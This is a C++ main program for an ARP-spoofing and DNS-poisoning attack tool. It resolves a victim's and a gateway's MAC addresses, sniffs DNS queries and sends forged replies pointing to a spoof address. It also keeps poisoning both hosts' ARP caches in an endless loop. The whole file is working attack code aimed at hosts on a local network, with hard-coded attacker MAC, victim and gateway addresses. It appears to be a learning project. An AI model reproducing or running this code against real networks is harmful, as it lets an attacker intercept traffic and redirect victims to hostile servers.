#include <iostream>
#include <unordered_map>
#include <vector>

#include <stdio.h>
#include <string.h>
#include <unistd.h>

#include "NetworkEngine.h"
#include "UdpStack.h"

#include "checksum.h"
#include "dns.h"

// get the interface name, ip of gateway and ip of victim
// main program we need: interface name, ip of gateway, ip of victim
// dns poison we need: domain to poison, what to poison too
int main(int argc, const char *argv[]) {
    const char *interfaceName = "eno1";                           // get this from config file
    std::unordered_map<std::string, std::string> domainsToPoison; // get this from config file

    unsigned char attackerMac[ETH_ALEN] = {0xe4, 0xb9, 0x7a,
                                           0xee, 0x8d, 0xa5}; // get this from config file
    unsigned char victimMac[ETH_ALEN];                        // get this from arp request
    unsigned char gatewayMac[ETH_ALEN];                       // get this from arp request
    struct in_addr victimIp;                                  // get this from config file
    struct in_addr gatewayIp;                                 // get this from config file

    struct arp_header victimArp;
    struct arp_header gatewayArp;
    struct arp_header arpRequestVictim;
    struct arp_header arpRequestGateway;

    // tmp fake spoofing address
    struct in_addr spoofIp;
    spoofIp.s_addr = 0x1300a8c0;

    victimIp.s_addr = 0x1400a8c0;
    gatewayIp.s_addr = 0x6400a8c0;

    // prepare the mac variables
    memset(victimMac, 0, ETH_ALEN);
    memset(gatewayMac, 0, ETH_ALEN);

    bool victimMacSet = false;
    bool gatewayMacSet = false;
    NetworkEngine ipEngine(interfaceName);

    // start arp sniffing
    ipEngine.LoopCallbacks.clear();
    ipEngine.LoopCallbacks.push_back(
        [&](const struct pcap_pkthdr *header, const unsigned char *packet) {
            struct arp_header *arp = (struct arp_header *)(packet + 14);

            if (ntohs(arp->arp_hd) == ARPHRD_ETHER && ntohs(arp->arp_pr) == ETH_P_IP) {
                struct in_addr *tmp = (struct in_addr *)arp->arp_spa;
                if (tmp->s_addr == victimIp.s_addr) {
                    for (int i = 0; i < ETH_ALEN; i++) {
                        victimMac[i] = arp->arp_sha[i];
                    }
                    victimMacSet = true;
                    std::cout << "victim mac acquired" << std::endl;
                } else if (tmp->s_addr == gatewayIp.s_addr) {
                    for (int i = 0; i < ETH_ALEN; i++) {
                        gatewayMac[i] = arp->arp_sha[i];
                    }
                    gatewayMacSet = true;
                    std::cout << "gateway mac acquired" << std::endl;
                } else {
                    std::cout << "received unwanted arp reply" << std::endl;
                }
            }
        });
    std::cout << "starting arp sniff" << std::endl;
    ipEngine.startSniff("arp");
    std::cout << "arp sniff started" << std::endl;

    craftArpRequest(&victimIp, ipEngine.getIp(), ipEngine.getMac(), &arpRequestVictim);
    craftArpRequest(&gatewayIp, ipEngine.getIp(), ipEngine.getMac(), &arpRequestGateway);

    // stop sniffing for macs once they have been found
    while (true) {
        if (!victimMacSet) {
            // send arp request to get mac address of victim
            std::cout << "requesting victim mac" << std::endl;
            ipEngine.sendArp(arpRequestVictim);
        }

        if (!gatewayMacSet) {
            // send arp request to get the mac address of gateway
            std::cout << "requesting gateway mac" << std::endl;
            ipEngine.sendArp(arpRequestGateway);
        }

        if (victimMacSet && gatewayMacSet) {
            std::cout << "stopping arp sniff" << std::endl;
            ipEngine.stopSniff();
            std::cout << "arp sniff has stopped" << std::endl;
            break;
        }

        sleep(5);
    }

    // start dns sniffing
    ipEngine.LoopCallbacks.clear();
    ipEngine.LoopCallbacks.push_back([&](const struct pcap_pkthdr *header,
                                         const unsigned char *packet) {
        UCharVector buffer(1500, 0);
        struct iphdr *ip;
        struct udphdr *udp;
        dnshdr *dns;

        int ipLen = 0;
        int udpLen = 0;
        int dnsLen = 0;

        // get ip hdr size
        ip = (iphdr *)(packet + 14);
        ipLen = ip->ihl * 4;

        // get udp hdr and size
        udp = (udphdr *)(packet + 14 + ipLen);
        udpLen = UdpStack::UDP_HDR_LEN;

        // get dns header
        dns = (dnshdr *)(packet + 14 + ipLen + UdpStack::UDP_HDR_LEN);

        std::cout << "dns packet received" << std::endl;

        // craft the poisoned response
        int responseSize = forgeDns(dns, &spoofIp, buffer.data());
        buffer.resize(responseSize);

        struct in_addr originalSrc;
        struct in_addr originalDst;

        originalSrc.s_addr = ip->saddr;
        originalDst.s_addr = ip->daddr;

        std::cout << "craft a response with size: " << buffer.size() << std::endl;

        // reply
        ipEngine.sendUdp(originalDst, originalSrc, ntohs(udp->dest), ntohs(udp->source), buffer);
        std::cout << "sending reply" << std::endl;
    });
    std::cout << "starting dns sniff" << std::endl;
    ipEngine.startSniff("udp and dst port domain");
    std::cout << "dns sniffing started" << std::endl;

    // start arp poisoning
    forgeArp(attackerMac, &gatewayIp, victimMac, &victimIp, &victimArp);
    forgeArp(attackerMac, &victimIp, gatewayMac, &gatewayIp, &gatewayArp);

    while (true) {
        ipEngine.sendArp(victimArp);
        ipEngine.sendArp(gatewayArp);
        sleep(5);
    }

    return 0;
}
